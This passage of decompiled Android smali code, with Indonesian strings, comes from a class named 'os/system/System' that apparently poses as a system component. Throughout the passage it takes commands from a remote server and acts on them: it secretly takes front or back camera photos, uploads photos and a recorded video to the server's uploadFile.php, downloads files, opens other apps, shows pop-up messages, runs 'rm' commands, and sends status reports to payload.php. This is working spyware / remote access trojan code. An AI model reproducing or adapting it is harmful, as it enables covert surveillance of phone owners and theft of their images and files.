    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v3, v4}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 323
    :cond_e
    const/4 v3, 0x1

    aget-object v2, v2, v3

    const-string v3, "back"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_f

    .line 324
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "rm "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/foto.jpg"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 326
    const-string v2, "back"

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Los/system/CamRuntime;->capturePhoto(Landroid/content/Context;Ljava/lang/String;)V

    .line 327
    const-wide/16 v2, 0x7d0

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 329
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/uploadFile.php"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 330
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const-string v2, "upload"

    sput-object v2, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 331
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/foto.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 332
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 335
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "kamera back sukses sedang mengupload"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_13

    .line 341
    :cond_f
    :goto_8
    :try_start_a
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-cam-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 342
    new-instance v3, Los/system/CamRuntime;

    invoke-direct {v3}, Los/system/CamRuntime;-><init>()V

    .line 343
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    sput-object v3, Los/system/CamRuntime;->path:Ljava/lang/String;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    .line 346
    const/4 v3, 0x3

    :try_start_b
    aget-object v3, v2, v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    .line 347
    sput v3, Los/system/System;->jcamera:I

    .line 348
    sget-object v4, Los/system/System;->TAG:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "jcamera:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v4, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 351
    const/4 v3, 0x2

    aget-object v3, v2, v3

    const-string v4, "1"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/4 v3, 0x1

    sput v3, Los/system/CamRuntime;->kualitas:I
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_12

    .line 355
    :cond_10
    :goto_9
    const/4 v3, 0x2

    :try_start_c
    aget-object v3, v2, v3

    const-string v4, "1"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_11

    const/4 v3, 0x1

    sput v3, Los/system/CamRuntime;->kualitas:I
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_11

    .line 358
    :cond_11
    :goto_a
    const/4 v3, 0x1

    :try_start_d
    aget-object v3, v2, v3

    const-string v4, "depan"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1a

    .line 359
    new-instance v2, Landroid/content/Intent;

    const-class v3, Los/system/CamRuntime;

    move-object/from16 v0, p1

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 360
    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 362
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->camServiceConeksi:Landroid/content/ServiceConnection;

    const/4 v4, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3, v4}, Los/system/System;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    .line 371
    :cond_12
    :goto_b
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->camHandler:Landroid/os/Handler;

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->camRefresh:Ljava/lang/Runnable;

    const-wide/16 v4, 0x1388

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_5

    .line 376
    :goto_c
    :try_start_e
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-app-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 377
    new-instance v3, Los/system/MainActivity;

    invoke-direct {v3}, Los/system/MainActivity;-><init>()V

    const/4 v4, 0x1

    aget-object v4, v2, v4

    const-string v5, "open"

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v5}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1b

    .line 379
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "APK:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v5, 0x1

    aget-object v2, v2, v5

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " berhasil dibuka"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_6

    .line 391
    :goto_d
    :try_start_f
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-up-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 392
    const-string v3, ""

    .line 394
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "video"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1c

    .line 395
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/REC_SYSTEM.mp4"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 397
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "upload video TUNGGU"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v3, v4}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 413
    :goto_e
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/uploadFile.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 414
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const-string v3, "upload"

    sput-object v3, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 415
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 416
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v3, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 419
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "upload file : "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_7

    .line 424
    :goto_f
    :try_start_10
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-down-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 425
    const-string v2, ""

    .line 426
    const-string v2, ""
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_10

    .line 428
    const/4 v2, 0x3

    :try_start_11
    aget-object v2, v4, v2

    .line 429
    const/4 v3, 0x1

    aget-object v3, v4, v3
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_8

    .line 435
    :goto_10
    :try_start_12
    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sput-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 436
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const-string v3, "download"

    sput-object v3, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 437
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v5, 0x2

    aget-object v5, v4, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "/"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 438
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 439
    const-wide/16 v2, 0x1388

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 442
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "dwnload file : "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v5, 0x1

    aget-object v4, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_10

    .line 447
    :goto_11
    :try_start_13
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-alert-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_a

    move-result-object v8

    .line 449
    const/4 v2, 0x4

    :try_start_14
    aget-object v2, v8, v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_f

    .line 452
    :goto_12
    const/4 v2, 0x3

    :try_start_15
    aget-object v2, v8, v2

    const-string v3, "atas"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1f

    const/16 v2, 0x30

    sput v2, Los/system/System;->alert_letak:I

    .line 458
    :cond_13
    :goto_13
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "biru"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_23

    const v2, -0xffff01

    sput v2, Los/system/System;->alert_warna:I

    .line 463
    :cond_14
    :goto_14
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "toast text:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v4, 0x1

    aget-object v4, v8, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " letak:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget v4, Los/system/System;->alert_letak:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " warna:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget v4, Los/system/System;->alert_warna:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " durasi:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget v4, Los/system/System;->alert_durasi:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/System;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 465
    new-instance v2, Los/system/System$4;

    sget v3, Los/system/System;->alert_durasi:I

    int-to-long v4, v3

    const-wide/16 v6, 0x64

    move-object/from16 v3, p0

    move-object/from16 v9, p1

    invoke-direct/range {v2 .. v9}, Los/system/System$4;-><init>(Los/system/System;JJ[Ljava/lang/String;Landroid/content/Context;)V

    .line 478
    invoke-virtual {v2}, Los/system/System$4;->start()Landroid/os/CountDownTimer;
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_9

    .line 500
    :goto_15
    :try_start_16
    sget-object v2, Los/system/System;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-/-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 502
    sget-object v3, Los/system/System;->TAG:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const/4 v5, 0x1

    aget-object v5, v2, v5

    const-string v6, "\n"

    invoke-virtual {v4, v5, v6}, Los/system/ReceiverBoot;->textSplit(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 503
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    const/4 v5, 0x1

    aget-object v5, v2, v5

    const-string v6, "\n"

    invoke-virtual {v4, v5, v6}, Los/system/ReceiverBoot;->textSplit(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x2

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v2}, Los/system/ReceiverBoot;->editor(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 506
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/System;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "text tersimpan siap dieksukesi<-_->"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/System;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

